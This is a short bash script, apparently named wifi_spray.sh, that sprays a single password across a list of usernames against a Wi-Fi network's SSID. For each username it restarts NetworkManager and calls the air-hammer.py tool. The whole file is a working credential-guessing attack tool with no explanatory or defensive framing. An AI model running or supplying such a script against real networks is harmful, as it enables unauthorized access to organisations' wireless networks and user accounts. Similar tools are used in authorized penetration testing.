#!/bin/bash

if [ "$#" -ne 4 ]; then
    echo "usage: sudo ./wifi_spray.sh username_file password wifi-interface SSID";
    exit 1;
fi

usernames="$1"
password="$2"
interface="$3"
ssid="$4"

echo "username_file: $usernames"
echo "password: $password" 
echo "interface: $interface"
echo "SSID: $ssid"

for user in `cat $usernames`; do
echo "trying $user";
systemctl restart NetworkManager
sleep 10
sudo python3 air-hammer.py -i $interface -U $user -P $password -e $ssid;
done
